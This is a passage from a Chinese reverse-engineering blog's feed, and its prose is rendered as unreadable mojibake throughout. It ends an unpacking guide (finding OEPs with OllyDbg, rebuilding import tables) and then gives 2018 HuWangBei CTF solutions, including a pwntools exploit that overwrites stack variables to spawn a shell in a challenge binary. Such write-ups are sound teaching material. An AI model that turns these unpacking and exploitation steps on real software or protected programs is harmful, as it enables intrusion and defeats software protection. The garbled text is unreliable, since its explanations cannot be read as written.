alt="æ‰¾åˆ°SFX"></p><p>åœ¨å‘½ä»¤æ¡†è¾“å…¥<code>tc eip&lt;xxxxxxxx</code>ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/18.png" alt="è¾“å…¥tcå‘½ä»¤"></p><p>ä¼šçœ‹åˆ°ODå·¦ä¸Šè§’å˜æˆäº†è·Ÿè¸ªï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/19.png" alt="å·¦ä¸Šè§’å˜æˆäº†è·Ÿè¸ª"></p><p>ç­‰å¾…ä¸€æ®µæ—¶é—´å°±ä¼šè·³è½¬åˆ°OEPã€‚</p><h2 id="SFXæ¨¡æ‹Ÿè·Ÿè¸ªæ³•"><a href="#SFXæ¨¡æ‹Ÿè·Ÿè¸ªæ³•" class="headerlink" title="SFXæ¨¡æ‹Ÿè·Ÿè¸ªæ³•"></a>SFXæ¨¡æ‹Ÿè·Ÿè¸ªæ³•</h2><p>ä»¥ASPackä¸ºä¾‹ã€‚è¿›å…¥<code>é€‰é¡¹-&gt;è°ƒè¯•è®¾ç½®</code>ï¼ˆ<code>Alt+O</code>ï¼‰ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/20.png" alt="è°ƒè¯•è®¾ç½®"></p><p>ä¸€èˆ¬æƒ…å†µé€‰æ‹©å—æ–¹å¼è·Ÿè¸ªæˆ–è€…å­—èŠ‚æ–¹å¼ï¼Œè¿™é‡Œé€‰æ‹©å‰è€…ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/21.png" alt="é€‰æ‹©å—æ–¹å¼è·Ÿè¸ª"></p><p>ç¡®å®šåï¼Œé‡æ–°è½½å…¥ï¼ˆ<code>Ctrl+f2</code>ï¼‰ï¼Œç›´æ¥è·³åˆ°äº†OEPã€‚</p><h2 id="æœ€åä¸€æ¬¡å¼‚å¸¸æ³•"><a href="#æœ€åä¸€æ¬¡å¼‚å¸¸æ³•" class="headerlink" title="æœ€åä¸€æ¬¡å¼‚å¸¸æ³•"></a>æœ€åä¸€æ¬¡å¼‚å¸¸æ³•</h2><p>ä»¥PECompactä¸ºä¾‹ã€‚å…ˆåœ¨è°ƒè¯•é€‰é¡¹ä¸­å¿½ç•¥æ‰€æœ‰å¼‚å¸¸ï¼š</p><p><img src alt></p><p>é‡æ–°è½½å…¥åï¼Œæ‰§è¡Œmæ¬¡shift+f9ï¼Œç›´åˆ°ç¨‹åºè·‘é£ã€‚ç„¶åé‡æ–°è½½å…¥ç¨‹åºï¼Œæ‰§è¡Œm-1æ¬¡shift+f9ã€‚åœ¨å †æ ˆçª—å£ä¸­æ‰¾åˆ°<code>SEå¥æŸ„</code>ï¼Œç„¶åctrl+gè½¬åˆ°SEå¥æŸ„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0045DE74    B8 F9CB45F0     mov eax,0xF045CBF9</span><br><span class="line">0045DE79    8D88 9E120010   lea ecx,dword ptr ds:[eax+0x1000129E]</span><br><span class="line">0045DE7F    8941 01         mov dword ptr ds:[ecx+0x1],eax</span><br><span class="line">0045DE82    8B5424 04       mov edx,dword ptr ss:[esp+0x4]</span><br><span class="line">0045DE86    8B52 0C         mov edx,dword ptr ds:[edx+0xC]</span><br><span class="line">0045DE89    C602 E9         mov byte ptr ds:[edx],0xE9</span><br><span class="line">0045DE8C    83C2 05         add edx,0x5</span><br><span class="line">0045DE8F    2BCA            sub ecx,edx                              ; ntdll_1.7720353D</span><br><span class="line">0045DE91    894A FC         mov dword ptr ds:[edx-0x4],ecx           ; qqspirit.0045DE74</span><br><span class="line">0045DE94    33C0            xor eax,eax</span><br><span class="line">0045DE96    C3              retn</span><br><span class="line">0045DE97    B8 78563412     mov eax,0x12345678                       ; ä¸‹æ–­ç‚¹</span><br></pre></td></tr></table></figure><p>éšåæ‰§è¡Œåˆ°æ–­ç‚¹å¤„ï¼Œå•æ­¥è·Ÿåˆ°OEPã€‚</p><h1 id="åŠ å¯†å£³"><a href="#åŠ å¯†å£³" class="headerlink" title="åŠ å¯†å£³"></a>åŠ å¯†å£³</h1><p>åŠ å¯†å£³ä¸»è¦å°±æ˜¯é’ˆå¯¹è½¯ä»¶çš„åŠ å¯†ä¿æŠ¤ï¼Œä¹Ÿæœ‰ä¸€äº›äººç”¨åŠ å¯†å£³æ¥åšä¸€äº›æœ¨é©¬çš„å…æ€ï¼Œå¯¼è‡´ä¸€äº›æ€è½¯ä»¶æŸ¥åˆ°è¯¥å£³å°±è¯¯æŠ¥ç—…æ¯’ã€‚åŠ å¯†å£³çš„ç§ç±»æœ‰å¾ˆå¤šï¼Œå¦‚æœæ‰‹å·¥è„±å’Œä¿®å¤ï¼Œå³ä½¿å¯¹é«˜æ‰‹æ¥è„±ï¼Œä¹Ÿéœ€è¦è´¹å¾ˆå¤§åŠ›æ°”ã€‚</p><h1 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h1><p>æœ‰æ—¶å€™è„±å®Œå£³å´ä¸èƒ½è¿è¡Œç¨‹åºï¼Œéœ€è¦ä¿®å¤IATã€‚é¦–å…ˆè½½å…¥ODï¼Œåœ¨OEPå¾€ä¸‹æ‰¾<code>call</code>ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/22.png" alt="æ‰¾åˆ°call"></p><p>æ‰¾åˆ°ååœ¨å‘½ä»¤æ¡†å¤„è¾“å…¥<code>d xxxxxx</code>ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/23.png" alt="æ•°æ®çª—å£ä¸­è·Ÿéš"></p><p>åœ¨æ•°æ®çª—å£ä¸­ï¼Œå¾€ä¸ŠæŸ¥æ‰¾ï¼Œç›´åˆ°æ•°æ®ä¸º0ï¼Œè®°å½•ä¸‹IATåœ°å€ï¼›å¾€ä¸‹ä¹ŸåŒæ ·ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/24.png" alt="æŸ¥æ‰¾é¦–å°¾åœ°å€"></p><p>åœ¨<code>ImportREC</code>ä¸­ä¿®æ”¹OEPåï¼Œä¸é‡‡å–è‡ªåŠ¨è·å–çš„æ–¹å¼ï¼Œæ‰‹åŠ¨è¾“å…¥IATèµ·å§‹åœ°å€å’Œå¤§å°ï¼Œå·æ‡’çš„åŠæ³•æ˜¯å¤§å°ç›´æ¥è¾“1000ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/25.png" alt="ImportRECä¿®æ”¹"></p><p>ç„¶åæ¸…é™¤æ‰æ— æ•ˆçš„ï¼Œè½¬å‚¨ä¸€ä¸‹å¾—åˆ°å®Œæ•´ç¨‹åºã€‚</p><h1 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h1><p><a href="https://www.cnblogs.com/hongyuyingxiao/p/9630173.html" target="_blank" rel="noopener">https://www.cnblogs.com/hongyuyingxiao/p/9630173.html</a><br><a href="https://findream.github.io/2018/07/15/%E5%B8%B8%E8%A7%81%E5%A3%B3%E7%9A%84%E8%84%B1%E5%A3%B3%E6%80%9D%E8%B7%AF/" target="_blank" rel="noopener">https://findream.github.io/2018/07/15/%E5%B8%B8%E8%A7%81%E5%A3%B3%E7%9A%84%E8%84%B1%E5%A3%B3%E6%80%9D%E8%B7%AF/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è®°å½•ä¸€ä¸‹è„±ä¸€äº›ç®€å•å£³çš„è¿‡ç¨‹ï¼ˆä¸»è¦æ˜¯æ‰¾OEPï¼‰ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>2018-æŠ¤ç½‘æ¯-review</title>
    <link href="https://qianfei11.github.io/2018/10/16/2018-%E6%8A%A4%E7%BD%91%E6%9D%AF-review/"/>
    <id>https://qianfei11.github.io/2018/10/16/2018-æŠ¤ç½‘æ¯-review/</id>
    <published>2018-10-16T10:18:29.000Z</published>
    <updated>2019-01-26T13:24:28.190Z</updated>
    
    <content type="html"><![CDATA[<p>çœ‹ç€å¤§ä½¬ä»¬çš„wpå¤ç°ä¸€æ³¢ã€‚</p><a id="more"></a><h1 id="è¿Ÿåˆ°çš„ç­¾åˆ°é¢˜"><a href="#è¿Ÿåˆ°çš„ç­¾åˆ°é¢˜" class="headerlink" title="è¿Ÿåˆ°çš„ç­¾åˆ°é¢˜"></a>è¿Ÿåˆ°çš„ç­¾åˆ°é¢˜</h1><p>å……åˆ†è¯æ˜äº†è‡ªå·±æ˜¯ä¸ªç­¾åˆ°é¢˜é€‰æ‰‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc = <span class="string">''</span></span><br><span class="line">enc = base64.b64decode(enc)</span><br><span class="line"><span class="comment"># test = 'flag&#123;'</span></span><br><span class="line"><span class="comment"># for i in range(len(test)):</span></span><br><span class="line"><span class="comment">#     print chr(ord(test) ^ ord(enc)),</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    flag += chr(ord(enc[i]) ^ ord(<span class="string">'f'</span>))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="FEZ"><a href="#FEZ" class="headerlink" title="FEZ"></a>FEZ</h1><p>ç»™å‡ºäº†ä¸€ä¸ªpyå®ç°çš„åŠ å¯†ç®—æ³•ï¼Œå’Œä¸€ä¸ªè¢«åŠ å¯†åè¾“å‡ºçš„logã€‚äº†è§£ä¸€ä¸‹ä¹‹åï¼Œå¤§æ¦‚æ˜¯è²æ–¯ç‰¹å°”(Feistel)å¯†ç ï¼Œä¹Ÿå°±æ˜¯DESã€‚</p><p>åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°æ¯”è¾ƒéš¾çš„ç‚¹æ˜¯ä¸­é—´çš„å¤šæ¬¡ç¹ççš„å¼‚æˆ–ï¼Œé€†å‘å®ç°è¾ƒéš¾ã€‚é€šè¿‡æ­£å‘åˆ†æåŠ å¯†çš„è¿‡ç¨‹æ¥è§‚å¯Ÿã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// lå³å·¦åŠéƒ¨åˆ†ï¼Œrå³å³åŠéƒ¨åˆ†</span><br><span class="line">   l + r</span><br><span class="line">1. r + r^l^k1</span><br><span class="line">2. r^l^k1 + r^l^k1^r^k2 =&gt; r^l^k1 + l^k1^k2</span><br><span class="line">3. l^k1^k2 + l^k1^k2^r^l^k1^k3 =&gt; l^k1^k2 + r^k2^k3</span><br><span class="line">4. r^k2^k3 + r^k2^k3^l^k1^k2^k4 =&gt; r^k2^k3 + r^l^k1^k3^k4</span><br><span class="line">5. r^l^k1^k3^k4 + r^l^k1^k3^k4^r^k2^k3^k5 =&gt; r^l^k1^k3^k4 + l^k1^k2^k4^k5</span><br><span class="line">6. l^k1^k2^k4^k5 + l^k1^k2^k4^k5^r^l^k1^k3^k4^k6 =&gt; l^k1^k2^k4^k5 + r^k2^k3^k5^k6</span><br><span class="line">7. r^k2^k3^k5^k6 + r^k2^k3^k5^k6^l^k1^k2^k4^k5^k7 =&gt; r^k2^k3^k5^k6 + r^l^k1^k3^k4^k6^k7</span><br><span class="line"></span><br><span class="line">// å¯¹äºmå’Œtestæ¥è¯´æ˜¯ä¸€æ ·çš„</span><br><span class="line">enc1 = xor(test, k) = t_r^k2^k3^k5^k6 + t_r^t_l^k1^k3^k4^k6^k7</span><br><span class="line">enc2 = xor(m, k) = m_r^k2^k3^k5^k6 + m_r^m_l^k1^k3^k4^k6^k7</span><br></pre></td></tr></table></figure><p>ç”±äºtestçš„å€¼æ˜¯å·²çŸ¥çš„ï¼Œå¯ä»¥å…ˆåˆ©ç”¨testçš„å·¦å³ä¸¤éƒ¨åˆ†æ±‚å‡ºk2356å’Œk13467ã€‚ç„¶åå†åˆ©ç”¨è¿™ä¸¤ä¸ªæ•°æ±‚å‡ºmçš„å·¦å³ä¸¤éƒ¨åˆ†ï¼Œmä¸­å°±å«æœ‰flagã€‚è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">test = <span class="string">'8664f7f564f097907c082328ebcdc95e8dc37eec3827fd9c93cc84ebb517c5e396c19d12e730ee3f3fb9e84110f9c92b29ddeab60797'</span></span><br><span class="line">enc1 = <span class="string">'4b4ce14cdb9ace2c678b9a64892cc9d5f2a61e7e2dc256877f2fb454c4d37760278640ab1737c62ba4a403acb14a893facfc1819b259'</span></span><br><span class="line">enc2 = <span class="string">'d4c898ee5f6b68d6120bd7fb11f5cf4d0431324c40e0b3a6ae9fbd1f17295be643c45ec7f306063dd1009ae5d62b0803c7909629aba7'</span></span><br><span class="line"></span><br><span class="line">t_l = test.decode(<span class="string">'hex'</span>)[:<span class="number">27</span>]</span><br><span class="line">t_r = test.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:]</span><br><span class="line"></span><br><span class="line">k2356 = xor(enc1.decode(<span class="string">'hex'</span>)[:<span class="number">27</span>], t_r)</span><br><span class="line">k13467 = xor(xor(enc1.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:], t_r), t_l)</span><br><span class="line"></span><br><span class="line">m_r = xor(enc2.decode(<span class="string">'hex'</span>)[:<span class="number">27</span>], k2356)</span><br><span class="line">m_l = xor(xor(enc2.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:], m_r), k13467)</span><br><span class="line">flag = m_l + m_r</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="GETTINGSTART"><a href="#GETTINGSTART" class="headerlink" title="GETTINGSTART"></a>GETTINGSTART</h1><p>æ‹¿åˆ°é¢˜ç›®è·‘äº†ä¸€ä¸‹ï¼Œç„¶åchecksecçœ‹çœ‹å¼€äº†ä»€ä¹ˆä¿æŠ¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qianfei@qianfeideMacBook-Air ~/ti/2018 huwangbei/GETTINGSTART checksec task_gettingStart_ktQeERc</span><br><span class="line">[*] &apos;/Users/qianfei/ti/2018 huwangbei/GETTINGSTART/task_gettingStart_ktQeERc&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>æ‹–è¿›idaé‡Œçœ‹ä¸€çœ‹ï¼Œå°±æ˜¯å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">double</span> v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">  v8 = <span class="number">1.797693134862316e308</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"HuWangBei CTF 2018 will be getting start after %lu seconds...\n"</span>, <span class="number">0L</span>L, <span class="number">1.797693134862316e308</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"But Whether it starts depends on you."</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v7 != <span class="number">0x7FFFFFFFFFFFFFFF</span>LL || v8 != <span class="number">0.1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"HuWangBei CTF 2018 will be getting start after %g seconds...\n"</span>, &amp;buf, v8);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>buf</code>å’Œ<code>v7</code>è¿˜æœ‰<code>v8</code>ä¹‹é—´çš„ç›¸å¯¹ä½ç½®ä¹Ÿæ¯”è¾ƒæ¸…æ¥šï¼Œä¸»è¦å°±æ˜¯è§£å†³doubleçš„<code>0.1</code>åœ¨å†…å­˜ä¸­å­˜å‚¨æ˜¯ä»€ä¹ˆæ ·å­çš„ã€‚é€šè¿‡å†™ä¸€ä¸ªå°çš„cç¨‹åºå¾—åˆ°ç»“æœï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> x = <span class="number">0.1</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> n = *(<span class="keyword">long</span> <span class="keyword">long</span>*)&amp;x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%llX"</span>, n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœä¸º<code>0x3FB999999999999A</code>ï¼Œä¹Ÿå°±æ˜¯<code>-1</code>çš„å€¼ã€‚expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./task1'</span>)</span><br><span class="line">v7 = <span class="number">0x7FFFFFFFFFFFFFFF</span></span><br><span class="line">v8 = <span class="number">0x3FB999999999999A</span></span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line">payload = (p64(v7) + p64(v8)).rjust(offset, <span class="string">'\0'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="RERERE"><a href="#RERERE" class="headerlink" title="RERERE"></a>RERERE</h1><p>æ­¤å¤„è®°å½•<a href="https://xz.aliyun.com/t/2892#toc-7" target="_blank" rel="noopener">lilacçš„writeup</a></p><p>é€šè¿‡æœç´¢å­—ç¬¦ä¸²æ‰¾åˆ°ç¨‹åºæ ¡éªŒä½ç½®ï¼Œåˆ†æè™šè¡¨ä¸­çš„å‡½æ•°ï¼Œå‘ç°è¿™åˆæ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œå› æ­¤åªéœ€è¦æŒ‰ç…§å¥—è·¯å°†æ¯ä¸€ä¸ªè™šæ‹Ÿæœºçš„æŒ‡ä»¤åˆ†ææ¸…æ¥šï¼Œæœ€ç»ˆåˆ†æå¾—åˆ°çš„è™šè¡¨æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.rdata:004031CC ; const RE::`vftable&apos;</span><br><span class="line">.rdata:004031CC ??_7RE@@6B@     dd offset assign_hi     ; DATA XREF: sub_4016A0+46â†‘o</span><br><span class="line">.rdata:004031D0                 dd offset get_par_hi</span><br><span class="line">.rdata:004031D4                 dd offset inc_ip</span><br><span class="line">.rdata:004031D8                 dd offset get_par_lo</span><br><span class="line">.rdata:004031DC                 dd offset dec_assign_hi</span><br><span class="line">.rdata:004031E0                 dd offset add_to_hi</span><br><span class="line">.rdata:004031E4                 dd offset subs_to_hi</span><br><span class="line">.rdata:004031E8                 dd offset inc_assign_hi</span><br><span class="line">.rdata:004031EC                 dd offset xor_to_hi</span><br><span class="line">.rdata:004031F0                 dd offset and_to_hi</span><br><span class="line">.rdata:004031F4                 dd offset mul_to_hi</span><br><span class="line">.rdata:004031F8                 dd offset mod_to_hi</span><br><span class="line">.rdata:004031FC                 dd offset push_hi</span><br><span class="line">.rdata:00403200                 dd offset assign_lo_to_hi</span><br><span class="line">.rdata:00403204                 dd offset load_to_hi</span><br><span class="line">.rdata:00403208                 dd offset push</span><br><span class="line">.rdata:0040320C                 dd offset pop</span><br><span class="line">.rdata:00403210                 dd offset store</span><br><span class="line">.rdata:00403214                 dd offset j_flag_neg1</span><br><span class="line">.rdata:00403218                 dd offset j_flag_1</span><br><span class="line">.rdata:0040321C                 dd offset j_not_flag</span><br><span class="line">.rdata:00403220                 dd offset jmp_bck_cnt</span><br><span class="line">.rdata:00403224                 dd offset cmp_hi_to_lo</span><br><span class="line">.rdata:00403228                 dd offset inc_mem_ptr</span><br><span class="line">.rdata:0040322C                 dd offset dec_mem_ptr</span><br><span class="line">.rdata:00403230                 dd offset xor_block</span><br><span class="line">.rdata:00403234                 dd offset init_regs</span><br><span class="line">.rdata:00403238                 dd offset get_res</span><br><span class="line">.rdata:0040323C                 dd offset execute_vm</span><br></pre></td></tr></table></figure><p>å…¶ä¸­åå­—ä¸­<code>hi</code>è¡¨ç¤ºç›®æ ‡å¯„å­˜å™¨ç¼–å·ï¼Œ<code>lo</code>è¡¨ç¤ºæºå¯„å­˜å™¨ç¼–å·ï¼Œ<code>execute_vm</code>æ˜¯æ‰§è¡Œè™šæ‹Ÿæœºä»£ç çš„å‡½æ•°ï¼Œæ‰§è¡Œç¨‹åºä¸­ç¡¬ç¼–ç çš„ä¸€æ®µè™šæ‹ŸæœºæŒ‡ä»¤ã€‚åœ¨idaä¸­æ–°å»ºä¸€ä¸ªç»“æ„ï¼Œå°†å„ä¸ªåç§»çš„åå­—å¡«ä¸Šè™šè¡¨å‡½æ•°åï¼Œå°±å¯ä»¥åœ¨<code>execute_vm</code>ä¸­çœ‹åˆ°<code>opcode</code>æ‰€å¯¹åº”çš„å…·ä½“å‡½æ•°æ˜¯ä»€ä¹ˆäº†ã€‚é€šè¿‡åˆ†æè¿™äº›å‡½æ•°çš„æ“ä½œä¹Ÿå¾ˆå®¹æ˜“ç¡®å®šè™šæ‹Ÿæœºçš„ç»“æ„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00000000 Vm              </span><br><span class="line">00000000 vtable          dd ?                   </span><br><span class="line">00000004 reg0            dd ?</span><br><span class="line">00000008 reg1            dd ?</span><br><span class="line">0000000C reg2            dd ?</span><br><span class="line">00000010 cnt             dd ?</span><br><span class="line">00000014 flag            dd ?</span><br><span class="line">00000018 maybe_mem       dd ?</span><br><span class="line">0000001C field_1C        dd ?</span><br><span class="line">00000020 stack           dd ?</span><br><span class="line">00000024 ip_ptr          dd ?</span><br></pre></td></tr></table></figure><p>äºæ˜¯å¯ä»¥å†™pythonè„šæœ¬å°†opcodeè¿˜åŸæˆæ˜“è¯»çš„ä¼ªæ±‡ç¼–è¯­è¨€çš„å½¢å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">85</span>, <span class="number">5</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">34</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">75</span>, <span 